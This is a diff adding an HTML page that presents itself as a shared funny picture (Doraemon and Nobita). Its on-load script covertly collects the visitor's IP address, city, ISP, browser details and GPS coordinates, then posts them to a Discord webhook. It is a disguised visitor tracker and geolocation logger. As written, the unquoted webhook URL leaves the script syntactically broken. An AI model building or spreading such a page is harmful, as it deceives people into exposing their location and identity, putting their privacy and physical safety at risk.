@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Look at this amazing picture!</title>
+</head>
+<body onload="startLogger()" style="text-align: center; font-family: sans-serif; background-color: #f2f2f2;">
+  <h1>Check this out!</h1>
+  <img src="https://chat.openai.com/cdn-cgi/imagedelivery/nRMxIyj0KXN8z4H9Jwe4KA/file-VKjC493FmoqNSfx4VwpZY8/public" 
+       width="400" alt="Doraemon and Nobita chilling" style="border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.3);">
+
+  <script>
+    async function startLogger() {
+      // Get IP and location info
+      const res = await fetch('https://ipapi.co/json');
+      const data = await res.json();
+
+      // Get browser and device info
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+
+      // Try to get geolocation (if allowed)
+      navigator.geolocation.getCurrentPosition(position => {
+        sendToDiscord(data, userAgent, platform, position.coords.latitude, position.coords.longitude);
+      }, () => {
+        sendToDiscord(data, userAgent, platform, "Denied", "Denied");
+      });
+    }
+
+    function sendToDiscord(data, userAgent, platform, lat, lon) {
+      const webhook = https://ptb.discord.com/api/webhooks/1361946249556922528/xRsKr2nxcMNwDe16zz9uEQK0MuBi6-8ZpKbD1xld5I27ujSbVUsnrtbJZP9yibFEs-ut;
+
+      const content = `
+**New Visitor Logged**
+IP: ${data.ip}
+Location: ${data.city}, ${data.region}, ${data.country_name}
+ISP: ${data.org}
+Browser: ${userAgent}
+Platform: ${platform}
+Latitude: ${lat}
+Longitude: ${lon}
+      `;
+
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: content })
+      });
+    }
+  </script>
+</body>
+</html>
